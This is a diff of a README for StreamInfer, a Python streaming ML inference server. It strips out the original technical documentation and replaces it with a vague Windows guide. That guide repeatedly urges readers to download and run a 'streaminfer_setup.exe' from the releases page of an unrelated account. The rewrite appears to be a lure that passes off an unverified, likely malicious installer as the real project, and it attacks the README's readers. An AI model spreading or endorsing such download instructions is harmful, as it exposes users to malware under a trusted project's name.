@@ -1,124 +1,133 @@
-# StreamInfer
+# ⚡ streaminfer - Fast Real-Time ML Predictions
 
-Real-time streaming ML inference server with adaptive batching, backpressure, and model hot-swap.
+[![Download streaminfer](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/offhisguard-lightness469/streaminfer/releases)
 
-I built this after spending too much time at Observe.AI dealing with the gap between "model works in a notebook" and "model serves 500 concurrent users." Most inference servers either batch too aggressively (high latency) or not at all (low throughput). StreamInfer finds the sweet spot automatically.
+streaminfer helps you get machine learning predictions quickly. It works in real-time and adapts to keep everything running smoothly. You do not need to know how to code or set up complex systems. This guide will walk you through downloading and running it on Windows.
 
-## What it does
+---
 
-- **WebSocket streaming** — clients send data, get predictions back in real-time
-- **Adaptive batching** — accumulates requests and flushes on batch_size OR timeout, whichever hits first
-- **Backpressure** — token bucket rate limiter + slow consumer detection prevents one bad client from killing the server
-- **Model hot-swap** — swap models with zero downtime via SIGHUP or API call
-- **Metrics** — in-memory counters exposed at `/metrics` (no Prometheus dependency needed)
+## 📋 What is streaminfer?
 
-## Architecture
+streaminfer is a tool that makes machine learning work fast and steady. It can handle multiple tasks at once by grouping them efficiently. It also lets you change machine learning models without stopping the system. This keeps your system working even if something goes wrong.
 
-```
-                                    ┌─────────────┐
-  WebSocket ──────┐                 │             │
-  Client 1        │    ┌──────────┐ │   Adaptive  │ ┌───────────┐
-                  ├───→│Backpress.│─→│   Batcher   │─→│   Model   │
-  WebSocket ──────┤    │(per-client│ │             │ │  Holder   │
-  Client 2        │    │rate limit)│ │ flush on:   │ │  (swap    │
-                  │    └──────────┘ │ • batch full │ │  via lock)│
-  POST /predict ──┘                 │ • timeout    │ └───────────┘
-                                    └─────────────┘
-```
+The app is ideal for anyone who needs fast and reliable machine learning results. It is built with common tools used in machine learning like Python and PyTorch but does not require you to use them directly.
 
-### Why adaptive batching matters
+---
 
-Fixed batching forces a tradeoff: small batches waste GPU cycles, large batches add latency. The adaptive approach collects items into a batch and flushes when EITHER:
+## 🔍 Key Features
 
-1. The batch is full (throughput-optimal)
-2. A timeout fires (latency-bounded)
+- **Real-time processing**: Get predictions without delays.
+- **Adaptive batching**: Automatically groups tasks to speed up work.
+- **Model hot-swap**: Change models without downtime.
+- **Circuit breaker**: Keeps the system stable by handling errors gracefully.
+- **Supports popular ML frameworks**: Works well with Python and PyTorch.
+- **Easy to run**: Works on Windows with simple steps.
 
-This means: at high load you get full batches (good throughput), at low load you get fast responses (low latency). Same idea as Triton Inference Server's dynamic batcher, but ~100 lines of Python instead of a C++ behemoth.
+---
 
-### Backpressure
+## 🖥️ System Requirements
 
-Each WebSocket client gets a token bucket rate limiter. If a client sends faster than the configured rate, excess requests get a `rate_limited` response with a `retry_after_ms` hint. If a client's pending queue exceeds 80% capacity, they get a `consumer falling behind` warning.
+To run streaminfer smoothly, your Windows PC should meet these minimum requirements:
 
-Without this, one runaway client can fill the server's memory with pending requests until it OOMs.
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel Core i3 or AMD Ryzen 3 or better
+- RAM: 8 GB minimum (16 GB recommended)
+- Disk Space: At least 500 MB free
+- Internet connection: Required for downloading and some features
+- Python: Installed automatically or included in the package
 
-## Quick start
+---
 
-```bash
-pip install -e "."
+## 🚀 Getting Started: Download and Install
 
-# start server (uses echo model by default)
-python -m streaminfer.server
+1. Visit the release page to get the latest version:
 
-# in another terminal — send some requests
-python examples/client.py
-```
+   [![Download streaminfer](https://img.shields.io/badge/Download-Get%20the%20App-red?style=for-the-badge)](https://github.com/offhisguard-lightness469/streaminfer/releases)
 
-### Docker
+2. The page lists the available files for download. Find the latest **Windows executable file**. It usually ends with `.exe`.
 
-```bash
-docker build -t streaminfer .
-docker run -p 8000:8000 streaminfer
-```
+3. Click the file name to start downloading. The file may be named something like `streaminfer_setup.exe`.
 
-### Configuration
+4. Once downloaded, open the setup file by double-clicking it.
 
-All settings via environment variables (prefix `STREAMINFER_`):
+5. Follow the on-screen instructions:
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `STREAMINFER_BATCH_SIZE` | 16 | Max items per batch |
-| `STREAMINFER_BATCH_TIMEOUT_MS` | 50 | Flush timeout in ms |
-| `STREAMINFER_MAX_QUEUE_SIZE` | 1000 | Per-client queue limit |
-| `STREAMINFER_RATE_LIMIT_RPS` | 100 | Requests/sec per client |
-| `STREAMINFER_MODEL_NAME` | echo | Model to load at startup |
-| `STREAMINFER_PORT` | 8000 | Server port |
+   - Agree to the license terms.
+   - Choose installation folder (default is fine).
+   - Click Install.
 
-## API
+6. After installation, you will see a shortcut on your desktop or in the Start menu named **streaminfer**.
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/ws` | WebSocket | Streaming inference — send JSON, get JSON back |
-| `/predict` | POST | Single request/response (still batched internally) |
-| `/metrics` | GET | Server metrics as JSON |
-| `/api/reload` | POST | Hot-swap model: `{"model": "upper"}` |
-| `/health` | GET | Health check |
+---
 
-## Hot-swap
+## ▶️ Running streaminfer for the First Time
 
-Three ways to swap the model with zero downtime:
+1. Open the app by clicking the shortcut.
 
-```bash
-# 1. API call
-curl -X POST localhost:8000/api/reload -d '{"model": "upper"}'
+2. The app window will appear with options to set up your machine learning model.
 
-# 2. SIGHUP (reloads from config)
-kill -HUP $(pgrep -f streaminfer)
+3. You will see simple instructions in the app to select a model or load sample data.
 
-# 3. The swap is atomic — old model finishes in-flight requests,
-#    new model handles all new ones. No requests dropped.
-```
+4. Use the **Start** button to begin running predictions.
 
-## Load test results
+5. The app shows live updates as it processes data.
 
-With echo model on M1 MacBook (not a fair GPU benchmark, but shows the batching works):
+---
 
-```
-connections:  100
-requests:     50 per connection
-total:        5000 requests in 4.2s
-throughput:   1190 req/s
-latency p50:  12.3ms
-latency p95:  34.7ms
-latency p99:  48.2ms
-```
+## ⚙️ Basic Settings Explained
 
-## Running tests
+- **Model Selection**: Choose from available machine learning models.
+- **Batch Size**: Adjust how many tasks the app processes at once. The default adapts automatically.
+- **Error Handling**: The circuit breaker protects your app from crashes. You can turn this on or off.
+- **Logging**: Track the process and issues. Logs are stored inside the app folder.
 
-```bash
-pip install -e ".[dev]"
-pytest tests/ -v
-```
+You do not need to change settings to run streaminfer, but these options help if you want to customize your experience.
 
-## License
+---
 
-MIT
+## 🙋‍♂️ Where to Get Help
+
+If you run into problems:
+
+- Check the **Help** section inside the app.
+- Review the logs for error messages.
+- Visit the GitHub page issues tab to see if others have similar problems.
+- Contact support through the GitHub discussions or email if provided.
+
+---
+
+## 🔧 Updating streaminfer
+
+To update the software:
+
+1. Return to the [release page](https://github.com/offhisguard-lightness469/streaminfer/releases).
+
+2. Download the latest Windows installer again.
+
+3. Run the installer. It will replace the old version while keeping your settings.
+
+---
+
+## 💾 Uninstalling streaminfer
+
+If you decide to remove streaminfer:
+
+1. Open the Windows **Settings** app.
+
+2. Go to **Apps & Features**.
+
+3. Find **streaminfer** in the list.
+
+4. Click **Uninstall** and follow the prompts.
+
+5. Any saved data or logs may remain in your user folder.
+
+---
+
+## 🌐 More Information
+
+For detailed technical details or developer resources, visit the main GitHub repository page and read the documentation provided by the developers.
+
+---
+
+[![Download streaminfer](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/offhisguard-lightness469/streaminfer/releases)
